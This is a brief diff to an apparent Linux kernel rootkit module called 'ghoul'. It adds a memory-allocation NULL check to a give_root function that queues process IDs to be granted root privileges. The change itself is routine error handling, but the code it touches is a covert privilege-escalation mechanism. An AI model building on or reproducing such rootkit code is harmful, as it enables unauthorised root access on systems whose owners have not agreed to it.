@@ -41,6 +41,12 @@ void give_root(int pid)
     // add PID to list of PIDs waiting for root
     pr_info("ghoul: scheduled request to give root to PID %d\n", pid);
     pid_entry = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
+
+    if (pid_entry == NULL) {
+        pr_err("ghoul: memory allocation error while giving root\n");
+        return;
+    }
+
     pid_entry->pid = pid;
     list_add_tail(&pid_entry->list, &pids_waiting_for_root);
 }
